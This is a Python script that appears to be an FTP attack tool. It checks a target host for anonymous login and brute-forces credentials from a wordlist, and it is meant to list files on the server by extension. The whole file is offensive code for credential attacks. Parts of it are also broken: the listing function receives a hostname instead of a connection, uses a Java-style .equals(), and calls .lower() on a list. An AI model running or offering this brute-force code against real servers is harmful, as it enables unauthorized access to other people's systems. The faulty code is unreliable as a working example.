import ftplib
import time
from os import truncate


def anonymousLogin(targetHostname):
    try:
        ftp = ftplib.FTP(targetHostname)
        ftp.login('anonymous', 'anonymous')
        print("\n[*] "+str(targetHostname) +" FTP Anonymous login successful")
        ftp.quit()
        return True
    except Exception :
        print("\n[ - ] "+str(targetHostname)+" FTP anonymous login failed")
        return False
    
def forceLogin(targetHostname, credentialsFile):
    creds = open(credentialsFile, 'r')
    for line in creds.readlines():
        time.sleep(1)
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: "+username + " : "+password)
        
        try:
            ftp = ftplib.FTP(targetHostname)
            ftp.login(username, password)
            print("\n[*] "+str(targetHostname)+" FTP login successful...  "+username+":"+password)
            ftp.quit()
            return(username, password)
        except Exception:
            pass
    print("\n[ - ] Unable to bruteforce any FTP login credentials from given list")
    return(None, None)

def displayContents(ftpconnection, extentions):
    try:
        directoryList = ftpconnection.nlst()
    except:
        directoryList = []
        print("[ - ] Unable to list contents of main directory...")
        print("[ - ] Moving to next Target.")
        return
    
    if(extentions.equals("")):
        for fileName in directoryList.lower():
            print(fileName)
    else:
        for ext in extentions:
            for fileName in directoryList.lower():
                if(ext in fileName):
                    print("File found matching extention requirement: "+fileName + "matching: "+ext+"\n")

import argparse
parser = argparse.ArgumentParser(description="Check FTP connections for anonymous login and brute force login")
parser.add_argument("-t","--TargetHost", metavar="targetHost", type=str,required=True, help="TargetHost address")
parser.add_argument("-w", "--wordlist", metavar="credentialWordlist", type=str, required=True, help="Credential Wordlist")
parser.add_argument("-x", "--extentions", metavar="extentions", type=str, required=False, help="desired extentions")

args = parser.parse_args()

target = args.TargetHost
file = args.wordlist

if(args.extentions == ""):
    extentions = ""
else:
    extentions = args.extentions

print("[+] Trying anonymous login... \n")
anonymousLogin(target)
print("[+] Starting to brute force... \n")
forceLogin(target, file)
displayContents(target, extentions)
